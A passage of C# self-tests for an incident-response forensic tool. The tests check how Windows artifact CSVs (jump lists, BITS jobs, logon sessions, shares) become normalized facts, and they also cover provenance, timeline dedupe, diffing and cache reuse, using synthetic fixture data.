            c.CachePath = c.ExtractPath;
            c.FactStore = new FactStore();
            c.FactStore.CaseId = c.CaseID;
            c.FactStore.Hostname = c.Hostname;
            if (facts != null)
                c.FactStore.Facts.AddRange(facts);
            c.FactStore.BuildEntityIndex();
            return c;
        }

        private static Fact CreateFact(string id, DateTime time, string source, string action, params string[] entityPairs)
        {
            var fact = new Fact(id, time, source, action);
            FactTimeMetadata.Apply(fact, FactTimeMetadata.EventTimeKind, FactTimeMetadata.HighConfidence);
            fact.SourceFile = "synthetic.csv";
            fact.RawRef = "synthetic.csv:2";
            fact.ParseLevel = FactProvenanceMetadata.StructuredParseLevel;
            if (entityPairs != null)
            {
                for (int i = 0; i + 1 < entityPairs.Length; i += 2)
                    fact.AddEntity(entityPairs[i], entityPairs[i + 1]);
            }
            return fact;
        }

        private static bool HasEntity(Fact fact, string type, string value)
        {
            return CountEntities(fact, type, value) > 0;
        }

        private static int CountEntities(Fact fact, string type, string value)
        {
            if (fact == null || fact.EntityRefs == null) return 0;
            return fact.EntityRefs.Count(e =>
                e != null &&
                string.Equals(e.Type, type, StringComparison.OrdinalIgnoreCase) &&
                string.Equals(e.Value, value, StringComparison.OrdinalIgnoreCase));
        }

        private static bool JumpListNormalizer_ToFacts_emits_entities()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectJL_" + Guid.NewGuid().ToString("N"));
            string csv = Path.Combine(dir, ArtifactNames.JumpListsCsv);
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(csv,
                    "Time,Source,AppId,Path,User,Details\n" +
                    "2020-01-02 03:04:05,Automatic,app123,C:\\Windows\\notepad.exe,DOMAIN\\alice,slot=1\n",
                    new UTF8Encoding(false));
                var facts = JumpListNormalizer.ToFacts(csv);
                if (facts == null || facts.Count != 1)
                    return false;
                Fact f = facts[0];
                if (!string.Equals(f.Source, JumpListNormalizer.SourceName, StringComparison.Ordinal))
                    return false;
                if (!string.Equals(f.Action, JumpListNormalizer.ActionJumpListDestinationObserved, StringComparison.Ordinal))
                    return false;
                if (!HasEntity(f, "Path", @"C:\Windows\notepad.exe"))
                    return false;
                if (!HasEntity(f, "User", @"DOMAIN\alice"))
                    return false;
                if (!HasEntity(f, "AppId", "app123"))
                    return false;
                return string.Equals(f.SourceFile, ArtifactNames.JumpListsCsv, StringComparison.OrdinalIgnoreCase);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool JumpListNormalizer_ToFacts_unc_derives_workstation_share()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectJLunc_" + Guid.NewGuid().ToString("N"));
            string csv = Path.Combine(dir, ArtifactNames.JumpListsCsv);
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(csv,
                    "Time,Source,AppId,Path,User,Details\n" +
                    ",Automatic,app,\\\\FILESERVER\\tools\\x\\y.txt,user1,\n",
                    new UTF8Encoding(false));
                var facts = JumpListNormalizer.ToFacts(csv);
                if (facts == null || facts.Count != 1)
                    return false;
                Fact f = facts[0];
                if (!HasEntity(f, "Workstation", "FILESERVER"))
                    return false;
                if (!HasEntity(f, "ShareName", "tools"))
                    return false;
                if (!HasEntity(f, "Path", @"\\FILESERVER\tools\x\y.txt"))
                    return false;
                return f.FallbackUsed;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool BitsJobNormalizer_ToFacts_unc_derives_share_and_remote_ip()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectBitsU_" + Guid.NewGuid().ToString("N"));
            string csv = Path.Combine(dir, ArtifactNames.BitsJobsCsv);
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(csv,
                    "DisplayName,OwnerAccount,JobState,RemoteName,LocalName,Description,ModificationTime,CreationTime\n" +
                    "MyJob,DOMAIN\\bob,Queued,\\\\10.10.10.10\\Public\\a.txt,C:\\temp\\a.dat,,2020-05-05 10:00:00,2020-05-05 09:00:00\n",
                    new UTF8Encoding(false));
                var facts = BitsJobNormalizer.ToFacts(csv);
                if (facts == null || facts.Count != 1)
                    return false;
                Fact f = facts[0];
                if (!HasEntity(f, "RemoteIP", "10.10.10.10"))
                    return false;
                if (!HasEntity(f, "ShareName", "Public"))
                    return false;
                if (!HasEntity(f, "User", @"DOMAIN\bob"))
                    return false;
                return HasEntity(f, "RemoteName", @"\\10.10.10.10\Public\a.txt");
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        /// <summary>
        /// BITS RemoteName may list multiple targets separated by ';'. One fact, multiple derived ShareName / Workstation / RemoteIP.
        /// </summary>
        private static bool BitsJobNormalizer_ToFacts_multi_segment_remote_name_derives_unc_and_urls()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectBitsMulti_" + Guid.NewGuid().ToString("N"));
            string csv = Path.Combine(dir, ArtifactNames.BitsJobsCsv);
            try
            {
                Directory.CreateDirectory(dir);
                string rn = @"\\srv-one\shareA\x.txt; \\srv-two\shareB\y.txt; http://192.168.0.1/a; https://10.20.30.40/b";
                File.WriteAllText(csv,
                    "DisplayName,OwnerAccount,JobState,RemoteName,LocalName,Description,ModificationTime,CreationTime\n" +
                    "J1,u1,Queued," + rn + ",,,2020-06-06 12:00:00,2020-06-06 11:00:00\n",
                    new UTF8Encoding(false));
                var facts = BitsJobNormalizer.ToFacts(csv);
                if (facts == null || facts.Count != 1)
                    return false;
                Fact f = facts[0];
                if (!HasEntity(f, "RemoteName", rn))
                    return false;
                if (!HasEntity(f, "Workstation", "srv-one") || !HasEntity(f, "Workstation", "srv-two"))
                    return false;
                if (!HasEntity(f, "ShareName", "shareA") || !HasEntity(f, "ShareName", "shareB"))
                    return false;
                if (!HasEntity(f, "RemoteIP", "192.168.0.1") || !HasEntity(f, "RemoteIP", "10.20.30.40"))
                    return false;
                return true;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool LogonSessionNormalizer_ToFacts_maps_user_sid_and_logon_metadata()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectLogon_" + Guid.NewGuid().ToString("N"));
            string csv = Path.Combine(dir, ArtifactNames.LogonSessionsCsv);
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(csv,
                    "ObservedAtUtc,StartTime,LogonId,User,Domain,Sid,LogonType,LogonTypeName,AuthenticationPackage,LogonProcessName\n" +
                    "2026-04-08T12:34:56Z,2026-04-08T11:00:00Z,999,DOMAIN\\alice,DOMAIN,S-1-5-21-1,10,RemoteInteractive,Negotiate,User32\n",
                    new UTF8Encoding(false));
                var facts = LogonSessionNormalizer.ToFacts(csv);
                if (facts == null || facts.Count != 1)
                    return false;
                Fact f = facts[0];
                return string.Equals(f.Action, "RemoteInteractiveSessionObserved", StringComparison.Ordinal) &&
                    HasEntity(f, "User", @"DOMAIN\alice") &&
                    HasEntity(f, "Sid", "S-1-5-21-1") &&
                    HasEntity(f, "LogonType", "10") &&
                    HasEntity(f, "AuthenticationPackage", "Negotiate") &&
                    HasEntity(f, "LogonProcess", "User32") &&
                    f.Time.Year >= 2026;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool NetworkResourceNormalizer_ToFacts_derives_unc_entities()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectNetRes_" + Guid.NewGuid().ToString("N"));
            string csv = Path.Combine(dir, ArtifactNames.NetworkResourcesCsv);
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(csv,
                    "ObservedAtUtc,LocalName,RemoteName,UserName,ConnectionState,ConnectionType,DisplayType,ProviderName,Persistent,Status,Comment\n" +
                    "2026-04-08T12:34:56Z,Z:,\\\\FILE01\\Tools,DOMAIN\\bob,Connected,1,3,Microsoft Windows Network,True,OK,\n",
                    new UTF8Encoding(false));
                var facts = NetworkResourceNormalizer.ToFacts(csv);
                if (facts == null || facts.Count != 1)
                    return false;
                Fact f = facts[0];
                return HasEntity(f, "User", @"DOMAIN\bob") &&
                    HasEntity(f, "Path", @"\\FILE01\Tools") &&
                    HasEntity(f, "RemoteName", @"\\FILE01\Tools") &&
                    HasEntity(f, "Workstation", "FILE01") &&
                    HasEntity(f, "ShareName", "Tools") &&
                    HasEntity(f, "Path", "Z:");
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool ServerConnectionNormalizer_ToFacts_maps_user_share_and_remote_host()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectSrvConn_" + Guid.NewGuid().ToString("N"));
            string csv = Path.Combine(dir, ArtifactNames.ServerConnectionsCsv);
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(csv,
                    "ObservedAtUtc,ComputerName,UserName,ShareName,ActiveTimeSec,IdleTimeSec,ConnectionId,NumberOfFiles,NumberOfUsers\n" +
                    "2026-04-08T12:34:56Z,10.10.10.20,DOMAIN\\carol,ADMIN$,120,5,77,2,1\n",
                    new UTF8Encoding(false));
                var facts = ServerConnectionNormalizer.ToFacts(csv);
                if (facts == null || facts.Count != 1)
                    return false;
                Fact f = facts[0];
                return HasEntity(f, "User", @"DOMAIN\carol") &&
                    HasEntity(f, "ShareName", "ADMIN$") &&
                    HasEntity(f, "RemoteName", "10.10.10.20") &&
                    HasEntity(f, "RemoteIP", "10.10.10.20");
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool FactProvenance_logon_session_uses_system_info_step()
        {
            var fact = new Fact("logon1", DateTime.UtcNow, "LogonSession", "Observed");
            fact.SourceFile = ArtifactNames.LogonSessionsCsv;
            fact.CollectionStep = "unknown";
            fact.CollectionStatus = "unknown";
            fact.CollectionPrivilege = "unknown";
            fact.ParseLevel = FactProvenanceMetadata.UnknownParseLevel;

            var c = new CaseData
            {
                CollectionCoverage = new CollectionCoverageReport
                {
                    Steps = new List<CollectionCoverageStep>
                    {
                        new CollectionCoverageStep { Step = "System Info", Status = "partial" }
                    }
                }
            };

            FactProvenanceHelper.ApplyCaseMetadata(c, new[] { fact });
            return string.Equals(fact.CollectionStep, "System Info", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.CollectionStatus, "partial", StringComparison.OrdinalIgnoreCase);
        }

        private static bool FactProvenance_bits_uses_execution_artifacts_step()
        {
            var fact = new Fact("bits1", DateTime.UtcNow, "BITS", "Transferred");
            fact.SourceFile = ArtifactNames.BitsJobsCsv;
            fact.CollectionStep = "unknown";
            fact.CollectionStatus = "unknown";
            fact.CollectionPrivilege = "unknown";
            fact.ParseLevel = FactProvenanceMetadata.UnknownParseLevel;

            var c = new CaseData
            {
                CollectionCoverage = new CollectionCoverageReport
                {
                    Steps = new List<CollectionCoverageStep>
                    {
                        new CollectionCoverageStep { Step = "Persistence", Status = "complete" },
                        new CollectionCoverageStep { Step = "Execution Artifacts", Status = "partial" }
                    }
                }
            };

            FactProvenanceHelper.ApplyCaseMetadata(c, new[] { fact });
            return string.Equals(fact.CollectionStep, "Execution Artifacts", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.CollectionStatus, "partial", StringComparison.OrdinalIgnoreCase);
        }

        private static bool FactProvenance_wmi_uses_execution_artifacts_step()
        {
            var fact = new Fact("wmi1", DateTime.UtcNow, "WmiPersistence", "Observed");
            fact.SourceFile = ArtifactNames.WmiPersistenceCsv;
            fact.CollectionStep = "unknown";
            fact.CollectionStatus = "unknown";
            fact.CollectionPrivilege = "unknown";
            fact.ParseLevel = FactProvenanceMetadata.UnknownParseLevel;

            var c = new CaseData
            {
                CollectionCoverage = new CollectionCoverageReport
                {
                    Steps = new List<CollectionCoverageStep>
                    {
                        new CollectionCoverageStep { Step = "Persistence", Status = "complete" },
                        new CollectionCoverageStep { Step = "Execution Artifacts", Status = "missing" }
                    }
                }
            };

            FactProvenanceHelper.ApplyCaseMetadata(c, new[] { fact });
            return string.Equals(fact.CollectionStep, "Execution Artifacts", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.CollectionStatus, "missing", StringComparison.OrdinalIgnoreCase);
        }

        private static bool FactProvenance_service_uses_persistence_step()
        {
            var fact = new Fact("svc1", DateTime.UtcNow, "Service", "ServiceConfigurationObserved");
            fact.SourceFile = ArtifactNames.ServicesCsv;
            fact.CollectionStep = "unknown";
            fact.CollectionStatus = "unknown";
            fact.CollectionPrivilege = "unknown";
            fact.ParseLevel = FactProvenanceMetadata.UnknownParseLevel;

            var c = new CaseData
            {
                CollectionCoverage = new CollectionCoverageReport
                {
                    Steps = new List<CollectionCoverageStep>
                    {
                        new CollectionCoverageStep { Step = "Persistence", Status = "complete" }
                    }
                }
            };

            FactProvenanceHelper.ApplyCaseMetadata(c, new[] { fact });
            return string.Equals(fact.CollectionStep, "Persistence", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.CollectionStatus, "complete", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.ParseLevel, FactProvenanceMetadata.StructuredParseLevel, StringComparison.OrdinalIgnoreCase);
        }

        private static bool FactProvenance_stored_credential_uses_system_info_step()
        {
            var fact = new Fact("cred1", DateTime.UtcNow, "StoredCredential", "StoredCredentialObserved");
            fact.SourceFile = ArtifactNames.StoredCredentialsTxt;
            fact.CollectionStep = "unknown";
            fact.CollectionStatus = "unknown";
            fact.CollectionPrivilege = "unknown";
            fact.ParseLevel = FactProvenanceMetadata.UnknownParseLevel;

            var c = new CaseData
            {
                CollectionCoverage = new CollectionCoverageReport
                {
                    Steps = new List<CollectionCoverageStep>
                    {
                        new CollectionCoverageStep { Step = "System Info", Status = "partial" }
                    }
                }
            };

            FactProvenanceHelper.ApplyCaseMetadata(c, new[] { fact });
            return string.Equals(fact.CollectionStep, "System Info", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.CollectionStatus, "partial", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.ParseLevel, FactProvenanceMetadata.RawArtifactDerivedParseLevel, StringComparison.OrdinalIgnoreCase);
        }

        private static bool FactProvenance_kerberos_ticket_uses_system_info_step()
        {
            var fact = new Fact("kerb1", DateTime.UtcNow, "KerberosTicketCache", "KerberosTicketCached");
            fact.SourceFile = ArtifactNames.KerberosTicketsTxt;
            fact.CollectionStep = "unknown";
            fact.CollectionStatus = "unknown";
            fact.CollectionPrivilege = "unknown";
            fact.ParseLevel = FactProvenanceMetadata.UnknownParseLevel;

            var c = new CaseData
            {
                CollectionCoverage = new CollectionCoverageReport
                {
                    Steps = new List<CollectionCoverageStep>
                    {
                        new CollectionCoverageStep { Step = "System Info", Status = "complete" }
                    }
                }
            };

            FactProvenanceHelper.ApplyCaseMetadata(c, new[] { fact });
            return string.Equals(fact.CollectionStep, "System Info", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.CollectionStatus, "complete", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.ParseLevel, FactProvenanceMetadata.RawArtifactDerivedParseLevel, StringComparison.OrdinalIgnoreCase);
        }

        private static bool FactProvenance_memory_acquisition_uses_memory_acquisition_step()
        {
            var fact = new Fact("memacq1", DateTime.UtcNow, "MemoryAcquisition", "MemoryAcquisitionComplete");
            fact.SourceFile = ArtifactNames.MemoryAcquisitionJson;
            fact.CollectionStep = "unknown";
            fact.CollectionStatus = "unknown";
            fact.CollectionPrivilege = "unknown";
            fact.ParseLevel = FactProvenanceMetadata.UnknownParseLevel;

            var c = new CaseData
            {
                CollectionCoverage = new CollectionCoverageReport
                {
                    Steps = new List<CollectionCoverageStep>
                    {
                        new CollectionCoverageStep { Step = "Memory acquisition", Status = "complete" }
                    }
                }
            };

            FactProvenanceHelper.ApplyCaseMetadata(c, new[] { fact });
            return string.Equals(fact.CollectionStep, "Memory acquisition", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.CollectionStatus, "complete", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.ParseLevel, FactProvenanceMetadata.SynthesizedParseLevel, StringComparison.OrdinalIgnoreCase);
        }

        private static bool FactProvenance_memory_analysis_uses_memory_analysis_step()
        {
            var fact = new Fact("memana1", DateTime.UtcNow, "MemoryAnalysis", "MemoryAnalysisPartial");
            fact.SourceFile = ArtifactNames.MemoryAnalysisJson;
            fact.CollectionStep = "unknown";
            fact.CollectionStatus = "unknown";
            fact.CollectionPrivilege = "unknown";
            fact.ParseLevel = FactProvenanceMetadata.UnknownParseLevel;

            var c = new CaseData
            {
                CollectionCoverage = new CollectionCoverageReport
                {
                    Steps = new List<CollectionCoverageStep>
                    {
                        new CollectionCoverageStep { Step = "Memory analysis handoff", Status = "partial" }
                    }
                }
            };

            FactProvenanceHelper.ApplyCaseMetadata(c, new[] { fact });
            return string.Equals(fact.CollectionStep, "Memory analysis handoff", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.CollectionStatus, "partial", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(fact.ParseLevel, FactProvenanceMetadata.SynthesizedParseLevel, StringComparison.OrdinalIgnoreCase);
        }

        private static bool Timeline_unified_jumplist_row_count_equals_activity_only_not_jump_csv_dup()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectTlJl_" + Guid.NewGuid().ToString("N"));
            string activity = Path.Combine(dir, ArtifactNames.ActivityTimelineCsv);
            string jump = Path.Combine(dir, ArtifactNames.JumpListsCsv);
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(activity,
                    "Time,Source,Action,Path,User,Details\n" +
                    "2021-01-01 10:00:00,JumpList,Recent,C:\\\\Windows\\\\notepad.exe,u1,\n",
                    new UTF8Encoding(false));
                File.WriteAllText(jump,
                    "Time,Source,AppId,Path,User,Details\n" +
                    "2021-01-01 10:00:00,Automatic,app1,C:\\\\Windows\\\\notepad.exe,u1,\n",
                    new UTF8Encoding(false));
                var actFacts = ActivityTimelineNormalizer.ToFacts(activity);
                var jlFacts = JumpListNormalizer.ToFacts(jump);
                int jumpRowsInActivity = actFacts.Count(f => f != null && string.Equals(f.Source, "JumpList", StringComparison.OrdinalIgnoreCase));
                if (jumpRowsInActivity != 1 || jlFacts.Count != 1)
                    return false;
                // If MainFormTimeline wrongly added jlFacts again, JumpList-shaped timeline rows would be jumpRowsInActivity + jlFacts.Count.
                int unifiedJumpListTimelineRows = jumpRowsInActivity;
                int wouldDoubleCount = jumpRowsInActivity + jlFacts.Count;
                return unifiedJumpListTimelineRows == 1 && wouldDoubleCount == 2;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        /// <summary>Hits <see cref="IR_Collect.MainForm.BuildTimelineEventsForSelfTest"/> → real BuildTimelineEvents (WP-D Jump List dedupe).</summary>
        private static bool BuildTimelineEvents_MainForm_path_jumplist_single_when_activity_and_jump_csv_present()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectTlMain_" + Guid.NewGuid().ToString("N"));
            string activity = Path.Combine(dir, ArtifactNames.ActivityTimelineCsv);
            string jump = Path.Combine(dir, ArtifactNames.JumpListsCsv);
            const string destPath = @"C:\Windows\notepad.exe";
            IR_Collect.MainForm form = null;
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(activity,
                    "Time,Source,Action,Path,User,Details\n" +
                    "2021-02-02 11:22:33,JumpList,Recent," + destPath + ",userA,\n",
                    new UTF8Encoding(false));
                File.WriteAllText(jump,
                    "Time,Source,AppId,Path,User,Details\n" +
                    "2021-02-02 11:22:33,Automatic,appZ," + destPath + ",userA,\n",
                    new UTF8Encoding(false));

                var c = new CaseData();
                c.ExtractPath = dir;
                c.CachePath = dir;
                c.Hostname = "SelfTestHost";
                c.MftEntries = null;

                form = new IR_Collect.MainForm();
                List<IR_Collect.MainForm.TimelineEvent> events = form.BuildTimelineEventsForSelfTest(c);
                if (events == null)
                    return false;

                int jlTimeline = 0;
                for (int i = 0; i < events.Count; i++)
                {
                    IR_Collect.MainForm.TimelineEvent ev = events[i];
                    if (ev == null || !string.Equals(ev.Source, "JumpList", StringComparison.OrdinalIgnoreCase))
                        continue;
                    if (ev.EntityRefs == null)
                        continue;
                    for (int j = 0; j < ev.EntityRefs.Count; j++)
                    {
                        EntityRef er = ev.EntityRefs[j];
                        if (er == null)
                            continue;
                        if (!string.Equals(er.Type, "Path", StringComparison.OrdinalIgnoreCase))
                            continue;
                        if (string.Equals(er.Value, destPath, StringComparison.OrdinalIgnoreCase))
                        {
                            jlTimeline++;
                            break;
                        }
                    }
                }

                return jlTimeline == 1;
            }
            finally
            {
                if (form != null)
                {
                    form.Dispose();
                    form = null;
                }
                TryDeleteDir(dir);
            }
        }

        private static bool AtomicFile_failure_preserves_published_output_and_cleans_staging()
        {
            string dir = Path.Combine(Path.GetTempPath(), "IRCollectAtomic_" + Guid.NewGuid().ToString("N"));
            string output = Path.Combine(dir, "canonical.csv");
            try
            {
                Directory.CreateDirectory(dir);
                File.WriteAllText(output, "trusted", new UTF8Encoding(false));

                bool failed = false;
                try
                {
                    AtomicFile.WriteText(output, new UTF8Encoding(false), delegate(StreamWriter writer)
                    {
                        writer.Write("partial");
                        throw new InvalidOperationException("simulated writer failure");
                    });
                }
                catch (InvalidOperationException)
                {
                    failed = true;
                }

                if (!failed || File.ReadAllText(output, Encoding.UTF8) != "trusted")
                    return false;
                if (Directory.GetFiles(dir, ".canonical.csv.partial-*.tmp", SearchOption.TopDirectoryOnly).Length != 0)
                    return false;

                AtomicFile.WriteAllText(output, "complete", new UTF8Encoding(false));
                return File.ReadAllText(output, Encoding.UTF8) == "complete" &&
                    Directory.GetFiles(dir, ".canonical.csv.partial-*.tmp", SearchOption.TopDirectoryOnly).Length == 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool DiffBuilder_detects_added_modified_and_reverse_removed_facts()
        {
            CaseData baseline = CreateDiffCase("baseline");
            CaseData target = CreateDiffCase("target");

            baseline.FactStore.Facts.Add(CreateDiffFact("p-good", "Process", "Executed", "Path", @"C:\Windows\good.exe", "good"));
            target.FactStore.Facts.Add(CreateDiffFact("p-good", "Process", "Executed", "Path", @"C:\Windows\good.exe", "good"));

            baseline.FactStore.Facts.Add(CreateDiffFact("svc-a", "Service", "ServiceConfigurationObserved", "ServiceName", "SvcA", "StartMode=Manual"));
            target.FactStore.Facts.Add(CreateDiffFact("svc-a", "Service", "ServiceConfigurationObserved", "ServiceName", "SvcA", "StartMode=Auto"));

            target.FactStore.Facts.Add(CreateDiffFact("p-evil", "Process", "Executed", "Path", @"C:\Temp\evil.exe", "evil"));
            target.FactStore.Facts.Add(CreateDiffFact("autorun-new", "Autorun", "Persist", "RegistryKey", @"HKLM\Software\Run\Evil", "evil autorun"));
            target.FactStore.Facts.Add(CreateDiffFact("service-new", "Service", "ServiceConfigurationObserved", "ServiceName", "SvcNew", "StartMode=Auto"));
            target.FactStore.Facts.Add(CreateDiffFact("task-new", "ScheduledTask", "TaskConfigurationObserved", "TaskName", @"\Nine\Evil", "enabled"));
            target.FactStore.Facts.Add(CreateDiffFact("hash-new", "MFT", "FileObserved", "Hash", new string('a', 64), "new file hash"));

            DiffReport forward = DiffBuilder.Build(baseline, target);
            if (forward == null || forward.DiffSchema != "diff_v1" || forward.ChangeCount != 6) return false;
            if (forward.BaselineRef == null || forward.BaselineRef.CollectionCoverageStatus != "complete") return false;
            if (!HasDiffChange(forward, "Process", "Added", "Path:c:\\temp\\evil.exe")) return false;
            if (!HasDiffChange(forward, "Persistence", "Added", "RegistryKey:hklm\\software\\run\\evil")) return false;
            if (!HasDiffChange(forward, "Persistence", "Added", "ServiceName:svcnew")) return false;
            if (!HasDiffChange(forward, "Persistence", "Added", "TaskName:\\nine\\evil")) return false;
            if (!HasDiffChange(forward, "File", "Added", "Hash:" + new string('a', 64))) return false;
            if (!HasDiffChange(forward, "Persistence", "Modified", "ServiceName:svca")) return false;
            if (forward.Changes.Any(x => string.Equals(x.EntityKey, "Path:c:\\windows\\good.exe", StringComparison.OrdinalIgnoreCase))) return false;
            DiffChange serviceChange = forward.Changes.FirstOrDefault(x =>
                string.Equals(x.EntityKey, "ServiceName:svca", StringComparison.OrdinalIgnoreCase));
            if (serviceChange == null || serviceChange.Confidence != "High") return false;
            DiffChange processChange = forward.Changes.FirstOrDefault(x =>
                string.Equals(x.EntityKey, "Path:c:\\temp\\evil.exe", StringComparison.OrdinalIgnoreCase));
            DiffFactReference processRef = processChange != null ? processChange.TargetFactRefs.FirstOrDefault() : null;
            if (processRef == null || processRef.ParseLevel != FactProvenanceMetadata.StructuredParseLevel ||
                processRef.CollectionStatus != "complete" || processRef.SourceFile != "Process.csv") return false;

            DiffReport reverse = DiffBuilder.Build(target, baseline);
            return reverse.ChangeCount == 6 &&
                HasDiffChange(reverse, "Process", "Removed", "Path:c:\\temp\\evil.exe") &&
                HasDiffChange(reverse, "Persistence", "Modified", "ServiceName:svca");
        }

        private static bool FactStoreBuildCache_reuses_unchanged_case()
        {
            string work = CreateTempDir("IRCollectFactCacheReuse_");
            try
            {
                string evidence = Path.Combine(work, "evidence");
                string cache = Path.Combine(work, "cache");
                Directory.CreateDirectory(evidence);
                WriteFactStoreCacheFixtures(evidence, false, false);

                CaseData firstCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis1"));
                FactStoreBuildResult first = FactStoreBuildCoordinator.Build(firstCase, true, true, cache);
                if (first.Store == null || first.Store.Count != 2 || first.BuildMode != "Full" ||
                    !first.CacheWritten || !File.Exists(first.CachePath))
                    return false;

                CaseData secondCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis2"));
                FactStoreBuildResult second = FactStoreBuildCoordinator.Build(secondCase, true, true, cache);
                return second.Store != null &&
                    second.Store.Count == first.Store.Count &&
                    second.BuildMode == "Reused" &&
                    second.ReusedGroups.Contains("All") &&
                    secondCase.FactStoreBuildMode == "Reused";
            }
            finally
            {
                TryDeleteDir(work);
            }
        }

        private static bool FactStoreBuildCache_reuses_normalization_warnings()
        {
            string work = CreateTempDir("IRCollectFactCacheWarnings_");
            try
            {
                string evidence = Path.Combine(work, "evidence");
                string cache = Path.Combine(work, "cache");
                Directory.CreateDirectory(evidence);
                WriteFactStoreCacheFixtures(evidence, false, false);

                const string warning = "CSV normalization was truncated at 500000 rows: synthetic.csv";
                CaseData firstCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis1"));
                firstCase.LoadWarnings.Add(warning);
                FactStoreBuildResult first = FactStoreBuildCoordinator.Build(firstCase, true, true, cache);
                if (first.Store == null || !first.CacheWritten) return false;

                CaseData secondCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis2"));
                FactStoreBuildResult second = FactStoreBuildCoordinator.Build(secondCase, true, false, cache);
                return second.Store != null && second.BuildMode == "Reused" &&
                    secondCase.LoadWarnings.Any(x => string.Equals(x, warning, StringComparison.Ordinal));
            }
            finally
            {
                TryDeleteDir(work);
            }
        }

        private static bool FactStoreBuildCache_rebuilds_only_changed_eventlog()
        {
            string work = CreateTempDir("IRCollectFactCacheEvent_");
            try
            {
                string evidence = Path.Combine(work, "evidence");
                string cache = Path.Combine(work, "cache");
                Directory.CreateDirectory(evidence);
                WriteFactStoreCacheFixtures(evidence, false, false);

                CaseData firstCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis1"));
                FactStoreBuildResult first = FactStoreBuildCoordinator.Build(firstCase, true, true, cache);
                if (first.Store == null || first.Store.Count != 2) return false;

                WriteFactStoreCacheFixtures(evidence, true, false);
                CaseData changedCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis2"));
                FactStoreBuildResult changed = FactStoreBuildCoordinator.Build(changedCase, true, true, cache);
                if (changed.Store == null || changed.BuildMode != "Incremental") return false;
                if (!changed.RebuiltGroups.Contains("EventLog:Security") ||
                    !changed.ReusedGroups.Contains("Non-EventLog"))
                    return false;

                int processFacts = changed.Store.Facts.Count(x =>
                    string.Equals(x.Source, ProcessNormalizer.SourceName, StringComparison.Ordinal));
                List<Fact> eventFacts = changed.Store.Facts.Where(x =>
                    string.Equals(x.Source, "EventLog:Security", StringComparison.Ordinal)).ToList();
                return processFacts == 1 && eventFacts.Count == 2 &&
                    eventFacts.Any(x => HasEntity(x, "EventId", "1102")) &&
                    eventFacts.Any(x => HasEntity(x, "EventId", "4624"));
            }
            finally
            {
                TryDeleteDir(work);
            }
        }

        private static bool FactStoreBuildCache_non_event_change_falls_back_full()
        {
            string work = CreateTempDir("IRCollectFactCacheFull_");
            try
            {
                string evidence = Path.Combine(work, "evidence");
                string cache = Path.Combine(work, "cache");
                Directory.CreateDirectory(evidence);
                WriteFactStoreCacheFixtures(evidence, false, false);

                CaseData firstCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis1"));
                FactStoreBuildResult first = FactStoreBuildCoordinator.Build(firstCase, true, true, cache);
                if (first.Store == null || first.BuildMode != "Full") return false;

                WriteFactStoreCacheFixtures(evidence, false, true);
                CaseData changedCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis2"));
                FactStoreBuildResult changed = FactStoreBuildCoordinator.Build(changedCase, true, true, cache);
                int processFacts = changed.Store != null ? changed.Store.Facts.Count(x =>
                    string.Equals(x.Source, ProcessNormalizer.SourceName, StringComparison.Ordinal)) : 0;
                return changed.BuildMode == "Full" &&
                    changed.Detail.IndexOf("require a full rebuild", StringComparison.OrdinalIgnoreCase) >= 0 &&
                    processFacts == 2;
            }
            finally
            {
                TryDeleteDir(work);
            }
        }

        private static bool FactStoreBuildCache_corrupt_cache_falls_back_full()
        {
            string work = CreateTempDir("IRCollectFactCacheCorrupt_");
            try
            {
                string evidence = Path.Combine(work, "evidence");
                string cache = Path.Combine(work, "cache");
                Directory.CreateDirectory(evidence);
                WriteFactStoreCacheFixtures(evidence, false, false);

                CaseData firstCase = CreateFactStoreCacheCase(evidence, Path.Combine(work, "analysis1"));
